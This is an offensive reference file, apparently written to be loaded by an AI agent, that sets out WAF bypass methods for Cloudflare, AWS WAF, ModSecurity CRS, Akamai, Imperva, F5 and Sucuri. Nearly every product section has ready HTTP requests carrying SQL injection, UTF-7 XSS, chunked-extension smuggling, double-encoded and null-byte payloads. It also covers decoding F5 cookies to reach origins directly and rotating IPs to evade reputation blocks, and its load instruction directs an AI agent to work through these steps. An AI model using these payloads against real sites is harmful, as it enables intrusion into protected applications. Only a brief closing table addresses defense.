---
name: waf-product-matrix
description: >-
  Per-product WAF bypass matrix for Cloudflare, AWS WAF, ModSecurity CRS, Akamai, Imperva,
  F5 BIG-IP ASM, and Sucuri. Each product covers fingerprint, parser differential, blind-spot
  payload, and bypass verdict criteria. Load from waf-bypass-techniques.md when generic
  techniques fail and you know (or suspect) the WAF vendor.
---

# WAF Product Matrix — Per-Product Bypass Reference

> **AI LOAD INSTRUCTION**: Use this file after identifying the WAF (see
> [waf-bypass-techniques.md](./waf-bypass-techniques.md) Phase 0). Generic encoding alone rarely
> defeats a mature commercial WAF; product-specific behavior (what the WAF normalizes, what it
> ignores, where its parser diverges from the backend) is the difference between "blocked" and
> "payload delivered". For each product, work through the four sections in order:
> **指纹特征 → 解析差异 → 盲区 payload → 绕过判据**.

---

## 0. How To Use This Matrix

The four sections per product map to a concrete test loop:

1. **指纹特征 (Fingerprint)** — confirm the vendor before assuming its behavior. A wrong
   fingerprint wastes bypass attempts.
2. **解析差异 (Parser differential)** — the WAF and the origin backend parse the *same bytes*
   differently. Bypasses live in that gap. This is the highest-value section.
3. **盲区 payload (Blind-spot payload)** — concrete request/payload shapes that the product's
   decoder does not (or historically did not) inspect.
4. **绕过判据 (Verdict criteria)** — how to tell a *true* bypass from a silently-stripped or
   blocked payload. Never accept "HTTP 200" alone as proof (see
   [waf-bypass-techniques.md](./waf-bypass-techniques.md) §5).

A bypass is **confirmed** only when the origin produces the *expected side effect* (data returned,
sleep observed, DNS/HTTP callback received) — not merely a non-403 status.

---

## 1. Cloudflare

### 1.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `cf-ray: <hex>` (every proxied request) |
| Response header | `cf-cache-status: HIT/MISS/DYNAMIC/...` |
| Response header | `server: cloudflare` (some configs) |
| Response header | `cf-mitigated: challenge` / `cf-chl-*` (challenge) |
| Block page | "Cloudflare Ray ID", JS challenge (`__cf_chl`), 1020 access denied, 403/503 with Cloudflare branding |
| TLS | Edge certificate issued by Cloudflare (`cloudflare.com` in cert SAN/issuer) |

### 1.2 解析差异

- **Normalization**: Cloudflare normalizes URL paths (percent-decoding, dot-segment collapse)
  and by default sorts/normalizes query strings for the cache key. A backend that decodes *twice*
  or does not normalize the same way is the classic gap: send `%2e%2e%2f` and Cloudflare may see
  a different path than a backend that decodes once more.
- **HTTP/2 → HTTP/1.1 downgrade**: Cloudflare terminates HTTP/2 at the edge and re-originates over
  HTTP/1.1 (or H2). Header names/values legal in HPACK (e.g. embedded newlines via obfuscation)
  may reach the origin differently than the edge's log shows. See
  [http2-specific-attacks.md](../api/http2-specific-attacks.md).
- **Body inspection**: Cloudflare's WAF (Managed Rules) inspects the request body up to a size
  limit. Oversized bodies (multi-MB) may be partially inspected; multipart file parts are often
  streamed with limited content inspection on the *file content*.
- **WebSocket**: Cloudflare inspects the upgrade but, once established, frames pass largely as
  raw data — smuggling through an established WS tunnel generally does **not** bypass Cloudflare
  rules that still apply at the HTTP layer.

### 1.3 盲区 payload

```http
# Oversized body to exceed inspection buffer (depends on plan/rule budget)
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <large>
# <8MB+ of benign padding> & q=' OR '1'='1
```

```http
# Multipart file-content blind spot (payload in filename or file body)
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----x
Content-Length: ...

------x
Content-Disposition: form-data; name="file"; filename="<script>alert(1)</script>.png"
Content-Type: image/png

<binary>
------x--
```

```http
# H2 pseudo-header / uppercase trick at origin after edge downgrade
:method: POST
:path: /search
:scheme: https
:authority: target.com
# edge re-originates; test whether origin sees headers the edge filtered
```

### 1.4 绕过判据

- Bypass confirmed when the origin-side sink fires: SQLi → boolean/time difference against the
  backend; XSS → reflected payload actually rendered in a browser context (not just echoed).
- `cf-ray` present but payload delivered → the request went *through* Cloudflare; absence of
  `cf-ray` means you are hitting the origin directly (different problem — see
  [fuck-cdn.md](../cdn/fuck-cdn.md)).
- 403/1020 with challenge but no `cf-mitigated` on a *subsequent* replayed request after solving
  the challenge → check you are reusing the `cf_clearance` cookie.
- Source note: Cloudflare WAF normalization & managed-rules behavior — vendor docs; cache-key
  normalization — Cloudflare "Cache Rules / default cache key".

---

## 2. AWS WAF

### 2.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `x-amzn-requestid`, `x-amz-cf-id` (CloudFront + WAF) |
| Response header | `server: awselb/2.0` / `server: CloudFront` |
| Block response | HTTP 403 with body `Request blocked` / "AWS WAF" (customizable action) |
| Edge | CloudFront (`*.cloudfront.net`), ALB (`awselb`), API Gateway, AppSync |

### 2.2 解析差异

- **Rule engine is token/string based, not full HTML/JS aware**: AWS WAF managed rules match on
  decoded strings, but the exact decoding order (percent → base64 → JS unicode) is configurable and
  often incomplete. **Double-encoding and Unicode obfuscation frequently evade** string-match rules.
- **Body inspection limits**: AWS WAF inspects the first N KB of the body (oversize handling
  configurable; default actions for oversize bodies are often `Match`/`No match` depending on the
  rule). Payloads placed *after* a large benign prefix may escape inspection.
- **JSON body parsing**: `aws_waf` JSON body parsing inspects keys/values but not JSON *structure*
  semantics; a `__proto__` or nested-array payload may not be normalized the way the backend's
  parser normalizes it.
- **Header vs cookie inspection asymmetry**: cookie inspection is often weaker than header/query
  inspection in default managed-rule groups.

### 2.3 盲区 payload

```http
# Oversize body prefix to push payload past inspection budget
POST /api/login HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: <large>

{"padding":"<8KB of 'A'>","user":"admin","password":"' OR '1'='1"}
```

```http
# Payload in cookie (weaker default inspection)
GET /profile HTTP/1.1
Host: target.example.com
Cookie: session=' UNION SELECT 1,2,3-- -; lang=en
```

```http
# JSON unicode escape (WAF string-match may not decode \uXXXX)
POST /api HTTP/1.1
Content-Type: application/json

{"q":"\u0055\u004e\u0049\u004f\u004e \u0053\u0045\u004c\u0045\u0043\u0054 1,2,3"}
```

### 2.4 绕过判据

- AWS WAF blocks return 403 with an `x-amzn-requestid`; a **non-403** is not proof — replay the
  same request with the payload neutered and confirm the *response differs* only because of the
  payload's effect at the sink.
- For JSON `\uXXXX` payloads, confirm the backend actually decodes them (observe the reflected or
  behavioral result); if the backend returns raw `\u0055...` un-decoded, the "bypass" is fake.
- Source note: AWS WAF managed rule groups & oversize handling — AWS docs; JSON body parsing
  behavior — AWS "AWS WAF request component inspection".

---

## 3. ModSecurity / OWASP CRS

### 3.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `server: Apache` + custom error (often no vendor banner) |
| Block response | HTTP 403 with a *generic* page; or `406 Not Acceptable` when CRS anomaly scoring denies |
| Behavior | High anomaly score → 403; often logs `ModSecurity: Access denied with code 403` |
| Default | OWASP CRS 3.x/4.x rules (rule id `9xxxxx`), Paranoia Level 1–4 |

### 3.2 解析差异

- **CRS is regex/signature based and heavily configurable**: detection strength scales with
  **Paranoia Level (PL)**. PL1 misses many obfuscations; PL4 is strict but still regex-bound.
- **Decoding**: CRS's `tx.allowed_methods`, transformation pipeline decodes URL-encoding but
  *historically* did not deeply decode double-encoding, mixed-case keyword obfuscation, or
  comment-splitting (`UN/**/ION`) without specific rules.
- **Anomaly scoring vs traditional blocking**: CRS uses **anomaly scoring** — a single rule hit may
  only raise the score, not block. An attack that stays *under* the threshold (`inbound_anomaly_score_threshold`, default 5) passes even if one rule fires.
- **Request body**: `SecRequestBodyAccess On` is not universal; some deployments only inspect
  headers/args, leaving the raw body unparsed.

### 3.3 盲区 payload

```sql
-- Comment splitting defeats naive keyword regex
UN/**/ION SE/**/LECT 1,2,3-- -

-- Mixed case defeats case-sensitive rules (CRS usually case-insensitive, but custom rules vary)
uNiOn sElEcT 1,2,3

-- Stay under the anomaly threshold: obfuscate enough that ≤1 rule fires
' OR '1'='1' /* benign-looking to individual rules */
```

```http
# Body not inspected in some deployments
POST /search HTTP/1.1
Content-Type: application/json

{"q":"' OR '1'='1"}
```

### 3.4 绕过判据

- Confirm the *anomaly score* path: a 403 means the score crossed the threshold. To confirm a
  bypass, verify the sink effect (SQLi boolean/time), because CRS may let a request pass yet the
  backend may independently reject it.
- `406 Not Acceptable` (not 403) with CRS = anomaly-score denial; a payload returning 200 while the
  *plain* payload 406s is a strong signal, but still verify the sink.
- Source note: OWASP CRS paranoia levels & anomaly scoring — OWASP ModSecurity Core Rule Set docs.

---

## 4. Akamai (Kona Site Defender / App & API Protector)

### 4.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `x-akamai-transformed`, `x-akamai-request-id`, `x-akamai-session-info` |
| Response header | `server: AkamaiGHost` |
| Block response | HTTP 403 with Akamai reference number / "Access Denied" page; `x-reference-error` |
| CDN | `*.akamaized.net`, `*.edgesuite.net` |

### 4.2 解析差异

- **Strict request-validation but header/query normalization configurable**: KSD normalizes paths
  and query strings; its "Behavior" rules are declarative. Header-based rules are often per-name;
  unknown/odd headers are passed through.
- **Bot Manager / Kona Site Defender layer**: much of Akamai's blocking is *bot* management, not
  pure signature matching — fingerprint (TLS/JA3, JS, cookie) triggers blocks more than payload
  content. **Signature evasion matters less than fingerprint evasion here** (see TLS fingerprint
  section in [waf-bypass-techniques.md](./waf-bypass-techniques.md)).
- **Chunked / encoding handling**: KSD reassembles chunked and decodes common encodings, but
  obfuscations that survive multiple decode passes (double encoding, mixed encodings) can slip.
- **Cache key exposure risk**: misconfigured properties may expose `x-cache-key` (high value for
  cache-key poisoning — see [web-cache-attacks.md](./web-cache-attacks.md)).

### 4.3 盲区 payload

```http
# Double URL encoding (edge decodes once; backend may decode again)
GET /search?q=%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1
Host: target.example.com
```

```http
# Payload split across duplicate parameters (HPP)
GET /search?q=benign&q=' OR '1'='1 HTTP/1.1
Host: target.example.com
```

### 4.4 绕过判据

- Akamai blocks carry a reference number / `x-reference-error`; absence of it plus a *changed sink
  behavior* confirms a pass. A 200 that strips the payload silently is **not** a bypass.
- If `x-cache-key` is exposed, confirm whether your injected header/param is actually part of the
  cache key before attempting cache poisoning.
- Source note: Akamai KSD/App & API Protector behavior — Akamai docs & advisory disclosures.

---

## 5. Imperva (Incapsula / Cloud WAF)

### 5.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `x-iinfo`, `x-cdn`, `x-incap-*` |
| Response cookie | `incap_ses_*`, `visid_incap_*`, `nlbi_*` |
| Block response | "Error 15" / "This request was blocked by the security rules" / `_Incapsula_Resource` challenge |
| CDN | `*.incapdns.net`, `*.impervadns.net` |

### 5.2 解析差异

- **Request smuggling history**: Imperva documented chunk-extension desync
  (see `imperva.com/blog/smuggling-requests-with-chunked-extensions...`). Chunk extension
  (`chunk-size;extension`) and malformed `Transfer-Encoding` are a known parser-differential
  surface between Imperva's edge and the origin.
- **Encoding**: Incapsula decodes URL-encoding; double-encoding, UTF-7, and null-byte insertion
  have historically slipped its string-match layer.
- **Incapsula challenge**: much blocking is a JS/challenge wall, not payload signature. The
  challenge cookie (`incap_ses_*`, `visid_incap_*`) gates access — solve it once, then test
  payloads.
- **Request size**: Incapsula has request-size limits; oversized requests can bypass deep
  inspection.

### 5.3 盲区 payload

```http
# Chunked with extension (parser differential vs origin)
POST /search HTTP/1.1
Host: target.example.com
Transfer-Encoding: chunked

5;ext=foo
sel
3
ect
1
 
0

```

```http
# UTF-7 encoded XSS (older string-match gap)
GET /search?q=%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4- HTTP/1.1
Host: target.example.com
```

```http
# Null byte / case obfuscation for SQL
GET /search?q=sel%00ect%20*%20from%20users HTTP/1.1
Host: target.example.com
```

### 5.4 绕过判据

- Solve the challenge first (get `incap_ses_*`/`visid_incap_*` cookies), then confirm the sink
  effect. A challenge bypass is separate from a *payload* bypass.
- For chunk-extension desync, confirm the origin actually treats the extension differently (e.g.
  two requests where the smuggled prefix is visible in a second response). See
  [web-request-smuggling.md](./web-request-smuggling.md).
- Source note: Imperva chunked-extension smuggling — imperva.com blog (URL in audit §7).

---

## 6. F5 BIG-IP ASM (Advanced WAF)

### 6.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `server: BigIP` (sometimes), `x-wa-info` (ASM-specific, some configs) |
| Response cookie | `TS<random>=...` (persistence), `BIGipServer<name>=...` (encrypted persistence) |
| Block response | ASM block page / "Request Rejected" / "The page cannot be displayed" + support ID |
| Detection | `BIGipServer` cookie is a very strong F5 indicator |

### 6.2 解析差异

- **BIGipServer cookie** can encode the pool-member IP/port — decrypting/decoding it reveals the
  backend address (useful for origin discovery, see
  [fuck-cdn.md](../cdn/fuck-cdn.md)).
- **ASM policy is signature + parameter/URL learning based**: it builds a *positive security model*
  of known parameters, so unknown parameters or odd encodings may be flagged. Bypasses lean on
  **encoding/decoding gaps** and **HTTP parser differences** rather than plain keyword evasion.
- **HTTP/2**: F5 ASM supports H2; downgrade to H1 and back can expose desync (see F5 advisories on
  HTTP request smuggling).
- **iRule flexibility**: behavior varies widely by deployment; a policy that only inspects specific
  parameters leaves others unguarded.

### 6.3 盲区 payload

```http
# Decode BIGipServer to find backend, then target origin directly (if reachable)
GET / HTTP/1.1
Host: target.example.com
Cookie: BIGipServer<name>=<value>
```

```http
# Unknown-parameter / alternate-parameter abuse (ASM positive model may miss it)
GET /search?qeery=' OR '1'='1 HTTP/1.1
Host: target.example.com
```

```http
# Percent-encoding variants on the same dangerous token
GET /search?q=%25%27%20%4f%52%20%27%31%27%3d%27%31 HTTP/1.1
Host: target.example.com
```

### 6.4 绕过判据

- Confirm the *origin sink* fired (SQLi time/boolean). F5 ASM's positive-security model means a
  200 on an unknown parameter may simply mean "not in policy" — still verify the backend consumed
  it as a real parameter.
- `BIGipServer` cookie → decode to IP:port and test whether the origin is directly reachable;
  direct reach is a stronger bypass than any payload obfuscation.
- Source note: F5 ASM & BIGipServer cookie encoding — F5 support docs & known encoding recipes.

---

## 7. Sucuri

### 7.1 指纹特征

| Signal | Value |
|---|---|
| Response header | `x-sucuri-id`, `x-sucuri-cache`, `server: Sucuri/Cloudproxy` |
| Response cookie | `sucuri_cloudproxy_uuid_*` |
| Block response | "Access Denied — Sucuri Website Firewall" |
| CDN | `*.sucuri.net`, `*.cloudproxy*` |

### 7.2 解析差异

- **Proxy-based WAF focused on malicious signatures + IP reputation**: Sucuri blocks known-bad IPs
  and signature-matched payloads. Its decoder is less sophisticated than Cloudflare/Akamai;
  **encoding obfuscation (double URL, hex, mixed case) and comment splitting frequently work**.
- **Header/cookie inspection weaker than query/body**: payloads moved to headers or cookies often
  pass.
- **IP reputation**: Sucuri aggressively blocks datacenter/VPN IPs — pairing payload work with
  IP-rotation matters more than the payload itself.

### 7.3 盲区 payload

```sql
-- Comment + case + hex obfuscation
UN/**/ION/**/SELE/**/CT 0x31,0x32,0x33-- -
```

```http
# Payload in a custom header rather than the query string
GET /search HTTP/1.1
Host: target.example.com
X-Forwarded-Host: ' OR '1'='1
X-Original-URL: /search?q=' OR '1'='1
```

```http
# Double-encoded SQLi
GET /search?q=%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1
Host: target.example.com
```

### 7.4 绕过判据

- Sucuri blocks show `x-sucuri-id` and the branded page; a response *without* them plus a changed
  sink behavior = payload delivered through the proxy.
- `X-Original-URL` / `X-Forwarded-Host` tricks only count if the *backend* consumes them — many
  do not. Verify by observing routing/behavior change, not just status.
- Source note: Sucuri WAF behavior — vendor docs & public testing reports.

---

## 8. 决策树：从产品到绕过

```
已识别 WAF 厂商?
├── Cloudflare → 试 H2 降级差异 / 超长 body / multipart file-content 盲区
├── AWS WAF    → 试 JSON \u 编码 / 超长 body 前缀 / cookie 承载 payload
├── ModSecurity/CRS → 试注释拆分 / 大小写 / 控制异常分数阈值（≤1 规则命中）
├── Akamai     → 优先解决 TLS/JA3 指纹与 Bot 挑战，再做签名绕过
├── Imperva    → 解 challenge 后试 chunk extension / UTF-7 / null byte
├── F5 ASM     → 解 BIGipServer cookie 找 origin，或未知参数绕过正向模型
└── Sucuri     → 编码混淆 + 头部承载 + IP 轮换（信誉比 payload 更关键）
```

---

## 9. DEFENSE PERSPECTIVE（检测/防御视角）

| 措施 | 说明 |
|---|---|
| 不依赖单一 WAF 解码 | WAF 解码顺序必须与后端一致（规范化对称） |
| 检查 body 而非只查参数 | 超长 body/multipart/cookie 是常见盲区 |
| 校验 sink 而非状态码 | 后端实际执行才叫命中；WAF 只做字符串匹配不充分 |
| 正向安全模型 | 学习合法参数集（F5 ASM 思路）减少未知参数绕过面 |
| 记录解码后命中的规则 id | 便于追踪「哪些规范化差异被利用」 |
| 同步 H2/H1 语义 | 降级走私由版本语义差引起（见 http2/request-smuggling 篇） |
